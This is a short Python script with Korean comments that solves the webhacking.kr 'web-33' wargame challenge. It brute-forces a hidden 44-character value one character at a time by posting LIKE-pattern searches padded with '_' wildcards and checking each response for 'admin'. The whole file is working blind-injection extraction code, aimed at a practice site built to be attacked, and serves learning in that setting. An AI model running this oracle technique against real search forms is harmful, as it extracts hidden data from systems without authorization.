import requests

sess = requests.Session()
url = 'https://webhacking.kr/challenge/web-33/'

contents = '' #진짜 답
temp = '' #와일드 카드로 테스트하는 값
length = 44

for i in range(0, length):
    for j in range(32, 126):
        if(j == 37 or j == 92 or j == 95):
            continue
        temp = contents + chr(j)
        temp += '_' * (length - i -1) # 체크하는 값 뒤는 다 와일드카드로 채워줌
        #print(temp)
        
        data = {
            'search' : temp
        }
        res = sess.post(url, data=data)

        if('admin' in res.text):
            contents += chr(j)
            print(chr(j))
            break
        else:
            if(j == 125):  # 32~125를 다 체크해봐도 admin이 없었던 경우 
                contents += chr(95) # 없는 건 와일드카드로 대체 후 생각해보자. 
                break
print('answer = ' + contents)